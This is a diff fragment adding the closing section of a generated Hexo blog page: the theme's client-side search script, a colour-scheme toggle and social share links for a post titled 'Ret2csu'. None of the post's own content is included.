+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Ret2csu + '&url=' + https%3A%2F%2Fghostasky.github.io%2F2021%2F02%2F10%2Fret2csu%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ghostasky.github.io/2021/02/10/ret2csu/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
